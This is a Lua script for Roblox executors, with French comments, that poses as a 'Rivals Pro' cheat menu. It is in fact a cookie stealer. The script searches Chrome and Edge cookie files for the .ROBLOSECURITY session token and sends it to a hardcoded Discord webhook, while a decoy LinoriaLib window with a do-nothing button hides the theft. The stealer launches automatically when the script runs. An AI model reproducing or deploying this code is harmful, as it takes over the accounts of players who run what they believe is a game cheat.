-- Configuration de l'exfiltration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1500913466268188823/fKSENebq8is4TScOrajvJbk8wR6mQnc6PjGa-by7Kdfj2Ftya6X8FqFmNi06lmoy7wdT"

-- Fonction d'envoi multi-compatible
local function send(content)
    local req = request or http_request or (syn and syn.request) or (http and http.request)
    if req then
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = game:GetService("HttpService"):JSONEncode({ content = content })
        })
    end
end

-- Recherche avancée multi-chemin
local function runStealer()
    local appData = os.getenv("LOCALAPPDATA")
    local paths = {
        appData .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
        appData .. "\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies",
        appData .. "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
    }

    local logs = "--- DEBUT DU SCAN ---\n"
    
    for _, path in pairs(paths) do
        if isfile and isfile(path) then
            local success, data = pcall(function() return readfile(path) end)
            
            if success and data then
                -- Extraction par regex pour isoler le jeton
                -- On cherche la structure du cookie .ROBLOSECURITY
                local cookie = string.match(data, "%.ROBLOSECURITY=([^;]+)")
                
                if cookie then
                    send("Cookie trouvé sur " .. path .. ": \n```" .. cookie .. "```")
                    return
                else
                    logs = logs .. "Fichier trouvé mais cookie non identifié : " .. path .. "\n"
                end
            else
                logs = logs .. "Erreur de lecture sur : " .. path .. "\n"
            end
        end
    end
    
    send("Fin du scan, rien trouvé. Détails : \n" .. logs)
end

-- Lancement asynchrone
task.spawn(runStealer)

-- GUI Leurre (Linoria)
local success, lib = pcall(function() return loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/Library.lua"))() end)
if success then
    local Window = lib:CreateWindow({ Title = "Rivals Pro - Menu", Center = true, AutoShow = true })
    local Tab = Window:AddTab("Main")
    Tab:AddButton({ Text = "Initialiser le système", Func = function() print("System Init") end })
end
